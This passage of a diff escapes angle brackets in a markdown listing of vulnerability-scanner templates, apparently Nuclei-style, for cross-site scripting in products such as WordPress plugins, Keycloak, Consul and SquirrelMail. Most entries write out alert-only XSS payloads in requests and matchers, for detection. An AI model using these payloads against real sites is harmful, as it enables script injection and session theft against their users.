+    1. \<div>\<script>alert(document.domain)\</script>\</div>
 
 **Type - word**
 - part - header
@@ -1760,7 +1760,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -1809,7 +1809,7 @@ Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFboH5ITu7DsGIG
 ------WebKitFormBoundaryFboH5ITu7DsGIGrD
 Content-Disposition: form-data; name="todate"
 
-2022-12-22<script>alert(document.domain)</script>
+2022-12-22\<script>alert(document.domain)\</script>
 ------WebKitFormBoundaryFboH5ITu7DsGIGrD
 Content-Disposition: form-data; name="search"
 
@@ -1817,7 +1817,7 @@ Content-Disposition: form-data; name="search"
 ------WebKitFormBoundaryFboH5ITu7DsGIGrD
 Content-Disposition: form-data; name="fromdate"
 
-2022-06-22<script>alert(document.domain)</script>
+2022-06-22\<script>alert(document.domain)\</script>
 ------WebKitFormBoundaryFboH5ITu7DsGIGrD--
 
 ```
@@ -1825,7 +1825,7 @@ Content-Disposition: form-data; name="fromdate"
 
 **Type - word**
 - words
-    1. <script>alert(document.domain)</script>
+    1. \<script>alert(document.domain)\</script>
     2. Report from 
 - condition - and
 
@@ -1858,7 +1858,7 @@ companyname=%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&regno=test&comp
 
 **Type - word**
 - words
-    1. value="><script>alert(document.domain)</script>" >
+    1. value=">\<script>alert(document.domain)\</script>" >
 
 **Type - status**
 - status
@@ -1894,7 +1894,7 @@ companyname=%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&regno=test&comp
 - condition - and
 
 ---
-# SquirrelMail Virtual Keyboard <=0.9.1 - Cross-Site Scripting
+# SquirrelMail Virtual Keyboard \<=0.9.1 - Cross-Site Scripting
 ## Description
 - SquirrelMail Virtual Keyboard plugin 0.9.1 and prior contains a cross-site scripting vulnerability via the vkeyboard.php parameter. It fails to properly sanitize user-supplied input, which allows an attacker to execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
 - severity - medium
@@ -1911,7 +1911,7 @@ companyname=%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&regno=test&comp
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -1938,7 +1938,7 @@ companyname=%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&regno=test&comp
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -1960,7 +1960,7 @@ companyname=%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&regno=test&comp
 
 **Type - word**
 - words
-    1. <img src=c onerror=alert(8675309)>
+    1. \<img src=c onerror=alert(8675309)>
 - part - body
 
 **Type - word**
@@ -1990,7 +1990,7 @@ companyname=%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&regno=test&comp
 
 **Type - word**
 - words
-    1. "><script>confirm(document.domain)</script>
+    1. ">\<script>confirm(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -2046,7 +2046,7 @@ referer=&login=%22%3Csvg%2Fonload%3Dalert%28document.domain%29%3E%22%40gmail.com
 
 **Type - word**
 - words
-    1. <svg/onload=alert(document.domain)>"@gmail.com') called at
+    1. \<svg/onload=alert(document.domain)>"@gmail.com') called at
 
 **Type - word**
 - part - header
@@ -2072,7 +2072,7 @@ referer=&login=%22%3Csvg%2Fonload%3Dalert%28document.domain%29%3E%22%40gmail.com
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - status**
@@ -2100,7 +2100,7 @@ referer=&login=%22%3Csvg%2Fonload%3Dalert%28document.domain%29%3E%22%40gmail.com
 
 **Type - word**
 - words
-    1. "><script>alert(document.domain)</script>
+    1. ">\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - status**
@@ -2126,7 +2126,7 @@ referer=&login=%22%3Csvg%2Fonload%3Dalert%28document.domain%29%3E%22%40gmail.com
 
 **Type - word**
 - words
-    1. <?xml version="1.0"?><x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
+    1. \<?xml version="1.0"?>\<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)\</x:script>
 
 **Type - word**
 - words
@@ -2165,7 +2165,7 @@ searchdata=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&search=
 - dsl
     1. contains(all_headers_2, "text/html")
     2. status_code_2 == 200
-    3. contains(body_2, 'Result against \"<script>alert(document.domain)</script>\" keyword')
+    3. contains(body_2, 'Result against \"\<script>alert(document.domain)\</script>\" keyword')
 - condition - and
 
 ---
@@ -2184,7 +2184,7 @@ searchdata=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&search=
 **Type - word**
 - part - body
 - words
-    1. value="2134"><script>alert(document.domain)</script>" min="0"
+    1. value="2134">\<script>alert(document.domain)\</script>" min="0"
 
 **Type - word**
 - part - header
@@ -2217,7 +2217,7 @@ SEARCH=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&COMPANY=&CATEGORY=&
 **Type - word**
 - part - body
 - words
-    1. Result : <script>alert(document.domain)</script>
+    1. Result : \<script>alert(document.domain)\</script>
     2. ERIS
 - condition - and
 
@@ -2249,7 +2249,7 @@ SEARCH=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&COMPANY=&CATEGORY=&
 
 **Type - word**
 - words
-    1. <script>alert(31337)</script>
+    1. \<script>alert(31337)\</script>
 - part - body
 
 **Type - word**
@@ -2286,11 +2286,11 @@ Content-Disposition: form-data; name="id"
 ------WebKitFormBoundaryCMJ5bh3B6m9767Em
 Content-Disposition: form-data; name="name"
 
-</script><script>alert(document.domain)</script>
+\</script>\<script>alert(document.domain)\</script>
 ------WebKitFormBoundaryCMJ5bh3B6m9767Em
 Content-Disposition: form-data; name="description"
 
-<script>alert(document.domain)</script>
+\<script>alert(document.domain)\</script>
 ------WebKitFormBoundaryCMJ5bh3B6m9767Em--
 
 ```
@@ -2305,7 +2305,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <p>Name: <b></script><script>alert(document.domain)</script></b>
+    1. \<p>Name: \<b>\</script>\<script>alert(document.domain)\</script>\</b>
 
 **Type - word**
 - part - header
@@ -2332,7 +2332,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. value="test"><script>alert(document.domain)</script>">
+    1. value="test">\<script>alert(document.domain)\</script>">
 
 **Type - word**
 - part - header
@@ -2344,7 +2344,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# WordPress Avada Website Builder <7.4.2 - Cross-Site Scripting
+# WordPress Avada Website Builder \<7.4.2 - Cross-Site Scripting
 ## Description
 - WordPress Avada Website Builder prior to 7.4.2 contains a cross-site scripting vulnerability. The theme does not properly escape bbPress searches before outputting them back as breadcrumbs.
 - severity - high
@@ -2358,7 +2358,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. "></script><script>alert(document.domain)</script>
+    1. ">\</script>\<script>alert(document.domain)\</script>
     2. avada-footer-scripts
 - condition - and
 
@@ -2389,7 +2389,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. <svg/onload=alert(/xss/)>
+    1. \<svg/onload=alert(/xss/)>
 - part - body
 
 **Type - word**
@@ -2398,7 +2398,7 @@ Host: {{Hostname}}
 - part - header
 
 ---
-# YesWiki <2022-07-07 - Cross-Site Scripting
+# YesWiki \<2022-07-07 - Cross-Site Scripting
 ## Description
 - YesWiki before 2022-07-07 contains a cross-site scripting vulnerability via the id parameter in the AccueiL URL.
 
@@ -2413,7 +2413,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>
+    1. \<script>alert(document.domain)\</script>
     2. Query failed:
 - condition - and
 
@@ -2444,7 +2444,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. <option value="/en/?{alert(1)}" selected="selected">
+    1. \<option value="/en/?{alert(1)}" selected="selected">
 
 **Type - word**
 - words
@@ -2497,7 +2497,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. <img src=a onerror=alert('{{randstr}}')>
+    1. \<img src=a onerror=alert('{{randstr}}')>
     2. MissingIncludeException
     3. lucee-err
 - part - body
@@ -2518,7 +2518,7 @@ Host: {{Hostname}}
 **Type - word**
 - words
     1. Kafdrop
-    2. <img src=x onerror=alert(2)>
+    2. \<img src=x onerror=alert(2)>
 - part - body
 - condition - and
 
@@ -2544,7 +2544,7 @@ Accept: */*
 
 **Type - regex**
 - regex
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - status**
@@ -2572,7 +2572,7 @@ Accept: */*
 
 **Type - word**
 - words
-    1. value="\"><script>alert(document.domain)</script>
+    1. value="\">\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -2608,7 +2608,7 @@ UPusername=%22%3E%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript
 
 **Type - word**
 - words
-    1. "><script>javascript:alert(document.cookie)</script>
+    1. ">\<script>javascript:alert(document.cookie)\</script>
 
 ---
 # Microsoft Exchange Server - Cross-Site Scripting
@@ -2646,13 +2646,13 @@ UPusername=%22%3E%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript
 ## Requests
 - Method - GET
 ### URL
-- {{BaseURL}}/editor_tools/module?type=files/admin"><script>alert(document.domain)</script>&params=filetype=images#path=
+- {{BaseURL}}/editor_tools/module?type=files/admin">\<script>alert(document.domain)\</script>&params=filetype=images#path=
 ### Matchers
 
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>" 0="filetype=images"
+    1. \<script>alert(document.domain)\</script>" 0="filetype=images"
 
 **Type - word**
 - part - header
@@ -2681,7 +2681,7 @@ UPusername=%22%3E%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript
 
 **Type - word**
 - words
-    1. <svg/onload=alert(document.domain)>
+    1. \<svg/onload=alert(document.domain)>
 - part - body
 
 **Type - word**
@@ -2690,7 +2690,7 @@ UPusername=%22%3E%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript
 - part - header
 
 ---
-# PHP Timeclock <=1.04 - Cross-Site Scripting
+# PHP Timeclock \<=1.04 - Cross-Site Scripting
 ## Description
 - PHP Timeclock 1.04 and prior contains multiple cross-site scripting vulnerabilities via login.php, timeclock.php, reports/audit.php. and reports/timerpt.php
 - severity - high
@@ -2707,7 +2707,7 @@ UPusername=%22%3E%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript
 
 **Type - word**
 - words
-    1. <svg/onload=alert`{{randstr}}`>
+    1. \<svg/onload=alert`{{randstr}}`>
     2. PHP Timeclock Admin Login
 - part - body
 - condition - and
@@ -2739,7 +2739,7 @@ comment=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&rating=0
 **Type - word**
 - part - body
 - words
-    1. <em style="color: black;"><script>alert(document.domain)</script>
+    1. \<em style="color: black;">\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -2766,7 +2766,7 @@ comment=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&rating=0
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -2791,7 +2791,7 @@ comment=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&rating=0
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -2846,7 +2846,7 @@ comment=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&rating=0
 
 **Type - word**
 - words
-    1. <script>alert(31337)</script>
+    1. \<script>alert(31337)\</script>
 - part - body
 
 **Type - word**
@@ -2868,14 +2868,14 @@ POST /index.php?mod=system&op=orgtree&do=orgtree HTTP/1
 Host: {{Hostname}}
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 
-id=%23&nouser=0&moderator=0&zero=<img+src=x+onerror=alert(document.domain)>&stype=0&range=0&showjob=0
+id=%23&nouser=0&moderator=0&zero=\<img+src=x+onerror=alert(document.domain)>&stype=0&range=0&showjob=0
 
 ```
 ### Matchers
 
 **Type - word**
 - words
-    1. "text":"<img src=x onerror=alert(document.domain)>
+    1. "text":"\<img src=x onerror=alert(document.domain)>
 
 **Type - word**
 - part - header
@@ -2887,7 +2887,7 @@ id=%23&nouser=0&moderator=0&zero=<img+src=x+onerror=alert(document.domain)>&styp
     1. 200
 
 ---
-# Keycloak <=8.0 - Cross-Site Scripting
+# Keycloak \<=8.0 - Cross-Site Scripting
 ## Description
 - Keycloak 8.0 and prior contains a cross-site scripting vulnerability.  An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.
 - severity - info
@@ -2899,7 +2899,7 @@ POST /auth/realms/master/clients-registrations/openid-connect HTTP/1.1
 Host: {{Hostname}}
 Content-Type: application/json
 
-{"<img onerror=confirm(1337) src/>":1}
+{"\<img onerror=confirm(1337) src/>":1}
 
 ```
 ### Matchers
@@ -2910,7 +2910,7 @@ Content-Type: application/json
 
 **Type - word**
 - words
-    1. Unrecognized field "<img onerror=confirm(1337) src/>"
+    1. Unrecognized field "\<img onerror=confirm(1337) src/>"
 
 ---
 # SteVe - Cross-Site Scripting
@@ -2929,7 +2929,7 @@ Content-Type: application/json
 **Type - word**
 - part - body
 - words
-    1. <script>alert(document.domain)</script>/services/?stylesheet=1">
+    1. \<script>alert(document.domain)\</script>/services/?stylesheet=1">
 
 **Type - word**
 - part - header
@@ -2955,7 +2955,7 @@ Content-Type: application/json
 
 **Type - word**
 - words
-    1. \u003d\u0022confirm(document.domain)\u0022\u003e</B> you cannot access your
+    1. \u003d\u0022confirm(document.domain)\u0022\u003e\</B> you cannot access your
 
 **Type - word**
 - part - header
@@ -2988,7 +2988,7 @@ blog
 ------WebKitFormBoundaryT8dS2PT0WtxACLyu
 Content-Disposition: form-data; name="bf_text"
 
-"><img src=x onerror=console.log(123);>
+">\<img src=x onerror=console.log(123);>
 ------WebKitFormBoundaryT8dS2PT0WtxACLyu
 Content-Disposition: form-data; name="file"; filename=""
 Content-Type: application/octet-stream
@@ -3024,7 +3024,7 @@ Host: {{Hostname}}
 - dsl
     1. contains(all_headers_2, 'text/html') && contains(all_headers_2, 'YesWiki')
     2. status_code_2 == 200
-    3. contains(body_2, '><img src=x onerror=console.log(123);>')
+    3. contains(body_2, '>\<img src=x onerror=console.log(123);>')
 - condition - and
 
 ---
@@ -3059,7 +3059,7 @@ searchdata=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&search=
 - dsl
     1. contains(all_headers_2, "text/html")
     2. status_code_2 == 200
-    3. contains(body_2, 'Result against \"<script>alert(document.domain)</script>\" keyword')
+    3. contains(body_2, 'Result against \"\<script>alert(document.domain)\</script>\" keyword')
 - condition - and
 
 ---
@@ -3128,7 +3128,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. "><script>alert(document.domain)</script>
+    1. ">\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -3180,7 +3180,7 @@ phps_query=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -3230,7 +3230,7 @@ phps_query=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 
 **Type - word**
 - words
-    1. <script>alert('XSS')</script>
+    1. \<script>alert('XSS')\</script>
 - part - body
 
 **Type - word**
@@ -3254,7 +3254,7 @@ phps_query=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 - part - body
 - words
     1. {{randstr}}
-    2. <form action="javascript:alert
+    2. \<form action="javascript:alert
 - condition - and
 
 **Type - status**
@@ -3331,7 +3331,7 @@ phps_query=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -3357,7 +3357,7 @@ phps_query=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -3383,7 +3383,7 @@ phps_query=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - status**
@@ -3409,7 +3409,7 @@ phps_query=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -3436,7 +3436,7 @@ phps_query=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -3448,7 +3448,7 @@ phps_query=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
     1. 200
 
 ---
-# Alert Before Your Post <= 0.1.1 - Cross-Site Scripting
+# Alert Before Your Post \<= 0.1.1 - Cross-Site Scripting
 ## Description
 - A cross-site scripting  vulnerability in post_alert.php in Alert Before Your Post plugin, possibly 0.1.1 and earlier, for WordPress allows remote attackers to inject arbitrary web script or HTML via the name parameter.
 - severity - medium
@@ -3461,7 +3461,7 @@ phps_query=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -3474,7 +3474,7 @@ phps_query=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
     1. 200
 
 ---
-# Advanced Text Widget < 2.0.2 - Cross-Site Scripting
+# Advanced Text Widget \< 2.0.2 - Cross-Site Scripting
 ## Description
 - A cross-site scripting (XSS) vulnerability in advancedtext.php in Advanced Text Widget plugin before 2.0.2 for WordPress allows remote attackers to inject arbitrary web script or HTML via the page parameter.
 - severity - medium
@@ -3488,7 +3488,7 @@ phps_query=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - word**
 - part - header
@@ -3500,7 +3500,7 @@ phps_query=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
     1. 200
 
 ---
-# WordPress Plugin Flexible Custom Post Type < 0.1.7 - Cross-Site Scripting
+# WordPress Plugin Flexible Custom Post Type \< 0.1.7 - Cross-Site Scripting
 ## Description
 - A cross-site scripting vulnerability in edit-post.php in the Flexible Custom Post Type plugin before 0.1.7 for WordPress allows remote attackers to inject arbitrary web script or HTML via the id parameter.
 - severity - medium
@@ -3513,7 +3513,7 @@ phps_query=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -3539,7 +3539,7 @@ phps_query=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -3552,7 +3552,7 @@ phps_query=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
     1. 200
 
 ---
-# WordPress Plugin Duplicator < 0.4.5 - Cross-Site Scripting
+# WordPress Plugin Duplicator \< 0.4.5 - Cross-Site Scripting
 ## Description
 - A cross-site scripting  vulnerability in files/installer.cleanup.php in the Duplicator plugin before 0.4.5 for WordPress allows remote attackers to inject arbitrary web script or HTML via the package parameter.
 - severity - medium
@@ -3565,7 +3565,7 @@ phps_query=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -3596,7 +3596,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body
 - words
-    1. page: '<script>alert(document.domain)</script>'
+    1. page: '\<script>alert(document.domain)\</script>'
     2. dhx_rel_path
 - condition - and
 
@@ -3623,7 +3623,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -3649,7 +3649,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -3675,7 +3675,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. <script>alert(1)</script>
+    1. \<script>alert(1)\</script>
 - part - body
 
 **Type - word**
@@ -3688,7 +3688,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Jeedom <=4.0.38 - Cross-Site Scripting
+# Jeedom \<=4.0.38 - Cross-Site Scripting
 ## Description
 - Jeedom through 4.0.38 contains a cross-site scripting vulnerability. An attacker can execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site.
 - severity - medium
@@ -3701,7 +3701,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. <script>document.title = "";alert(document.domain);" - Jeedom"</script>
+    1. \<script>document.title = "";alert(document.domain);" - Jeedom"\</script>
 - part - body
 
 **Type - status**
@@ -3714,7 +3714,7 @@ Host: {{Hostname}}
     1. text/html
 
 ---
-# Jenkin Audit Trail <=3.2 - Cross-Site Scripting
+# Jenkin Audit Trail \<=3.2 - Cross-Site Scripting
 ## Description
 - Jenkins Audit Trail 3.2 and earlier does not escape the error message for the URL Patterns field form validation, resulting in a reflected cross-site scripting vulnerability.
 - severity - medium
@@ -3728,7 +3728,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. <h1>sample
+    1. \<h1>sample
 - part - body
 
 **Type - word**
@@ -3741,7 +3741,7 @@ Host: {{Hostname}}
     1. 200
 
 ---
-# Nova Lite < 1.3.9 - Cross-Site Scripting
+# Nova Lite \< 1.3.9 - Cross-Site Scripting
 ## Description
 - Nova Lite before 1.3.9 for WordPress is susceptible to reflected cross-site scripting via search.php.
 - severity - medium
@@ -3754,7 +3754,7 @@ Host: {{Hostname}}
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - word**
@@ -3803,7 +3803,7 @@ daterange=%22%2F%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 - dsl
     1. status_code_2 == 200
     2. contains(all_headers_2, "text/html")
-    3. contains(body_2, "value=\"\"/><script>alert(document.domain)</script>")
+    3. contains(body_2, "value=\"\"/>\<script>alert(document.domain)\</script>")
     4. contains(body_2, "DomainMOD")
 - condition - and
 
@@ -3823,7 +3823,7 @@ daterange=%22%2F%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 **Type - word**
 - part - body
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 
 **Type - status**
 - status
@@ -3849,14 +3849,14 @@ Host: {{Hostname}}
 Content-Type: application/x-www-form-urlencoded
 X-NITRO-USER: xpyZxwy6
 
-sid=254&pe=1,2,3,4,5&appname=%0a</title><script>alert(31337)</script>&au=1&username=nsroot
+sid=254&pe=1,2,3,4,5&appname=%0a\</title>\<script>alert(31337)\</script>&au=1&username=nsroot
 
 ```
 ### Matchers
 
 **Type - word**
 - words
-    1. </title><script>alert(31337)</script>
+    1. \</title>\<script>alert(31337)\</script>
 - part - body
 
 **Type - status**
@@ -3869,7 +3869,7 @@ sid=254&pe=1,2,3,4,5&appname=%0a</title><script>alert(31337)</script>&au=1&usern
 - part - header
 
 ---
-# WordPress Catch Breadcrumb <1.5.4 - Cross-Site Scripting
+# WordPress Catch Breadcrumb \<1.5.4 - Cross-Site Scripting
 ## Description
 - WordPress Catch Breadcrumb plugin before 1.5.4 contains a reflected cross-site scripting vulnerability via the s parameter (a search query). Also affected are 16 themes if the plugin is enabled: Alchemist and Alchemist PRO, Izabel and Izabel PRO, Chique and Chique PRO, Clean Enterprise and Clean Enterprise PRO, Bold Photography PRO, Intuitive PRO, Devotepress PRO, Clean Blocks PRO, Foodoholic PRO, Catch Mag PRO, Catch Wedding PRO, and Higher Education PRO.
 
@@ -3883,7 +3883,7 @@ sid=254&pe=1,2,3,4,5&appname=%0a</title><script>alert(31337)</script>&au=1&usern
 
 **Type - word**
 - words
-    1. <img src=x onerror=alert(123);>
+    1. \<img src=x onerror=alert(123);>
     2. catch-breadcrumb
 - part - body
 - condition - and
@@ -3898,7 +3898,7 @@ sid=254&pe=1,2,3,4,5&appname=%0a</title><script>alert(31337)</script>&au=1&usern
     1. 200
 
 ---
-# McAfee ePolicy Orchestrator <5.10.9 Update 9 - Cross-Site Scripting
+# McAfee ePolicy Orchestrator \<5.10.9 Update 9 - Cross-Site Scripting
 ## Description
 - McAfee ePolicy Orchestrator before 5.10.9 Update 9 is vulnerable to a cross-site scripting vulnerability that allows administrators to inject arbitrary web script or HTML via multiple parameters where the administrator's entries were not correctly sanitized.
 reference:
@@ -3930,12 +3930,12 @@ Connection: close
 **Type - word**
 - words
     1. Policy Name
-    2. '"><svg/onload=alert(document.domain)>
+    2. '">\<svg/onload=alert(document.domain)>
 - condition - and
 - part - body
 
 ---
-# HashiCorp Consul/Consul Enterprise <=1.9.4 - Cross-Site Scripting
+# HashiCorp Consul/Consul Enterprise \<=1.9.4 - Cross-Site Scripting
 ## Description
 - HashiCorp Consul and Consul Enterprise up to version 1.9.4 are vulnerable to cross-site scripting via the key-value (KV) raw mode.
 
@@ -3947,7 +3947,7 @@ Connection: close
 PUT {{BaseURL}}/v1/kv/{{randstr}} HTTP/1.1
 Host: {{Hostname}}
 
-<!DOCTYPE html><script>alert(document.domain)</script>
+\<!DOCTYPE html>\<script>alert(document.domain)\</script>
 
 ```
 ### Step - 2
@@ -3970,7 +3970,7 @@ Host: {{Hostname}}
 **Type - word**
 - part - body_2
 - words
-    1. <!DOCTYPE html><script>alert(document.domain)</script>
+    1. \<!DOCTYPE html>\<script>alert(document.domain)\</script>
 
 ---
 # PHPGurukul Hospital Management System - Cross-Site Scripting
@@ -4003,7 +4003,7 @@ doctorspecilization=%3C%2Ftd%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fsc
 **Type - word**
 - part - body
 - words
-    1. <td class="hidden-xs"></td><script>alert(document.domain);</script><td>
+    1. \<td class="hidden-xs">\</td>\<script>alert(document.domain);\</script>\<td>
 
 **Type - word**
 - part - header
@@ -4015,7 +4015,7 @@ doctorspecilization=%3C%2Ftd%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fsc
     1. 200
 
 ---
-# Apache OFBiz <=16.11.07 - Cross-Site Scripting
+# Apache OFBiz \<=16.11.07 - Cross-Site Scripting
 ## Description
 - Apache OFBiz 16.11.01 to 16.11.07 is vulnerable to cross-site scripting because data sent with contentId to /control/stream is not sanitized.
 - severity - medium
@@ -4028,7 +4028,7 @@ doctorspecilization=%3C%2Ftd%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fsc
 
 **Type - word**
 - words
-    1. <svg/onload=alert(/xss/)>
+    1. \<svg/onload=alert(/xss/)>
 - part - body
 
 **Type - word**
@@ -4087,7 +4087,7 @@ SAMLResponse=%22%3E%3Csvg/onload=alert(/{{randstr}}/)%3E
 
 **Type - word**
 - words
-    1. <svg/onload=alert(/{{randstr}}/)>
+    1. \<svg/onload=alert(/{{randstr}}/)>
 - part - body
 
 **Type - status**
@@ -4117,7 +4117,7 @@ SAMLResponse=%22%3E%3Csvg/onload=alert(/{{randstr}}/)%3E
 
 **Type - word**
 - words
-    1. <script>alert('xss')</script>
+    1. \<script>alert('xss')\</script>
 - part - body
 
 **Type - word**
@@ -4139,7 +4139,7 @@ SAMLResponse=%22%3E%3Csvg/onload=alert(/{{randstr}}/)%3E
 
 **Type - word**
 - words
-    1. </script><script>alert(document.domain)</script>
+    1. \</script>\<script>alert(document.domain)\</script>
 - part - body
 
 **Type - status**
@@ -4152,7 +4152,7 @@ SAMLResponse=%22%3E%3Csvg/onload=alert(/{{randstr}}/)%3E
     1. text/html
 
 ---
-# Revive Adserver <=5.0.3 - Cross-Site Scripting
+# Revive Adserver \<=5.0.3 - Cross-Site Scripting
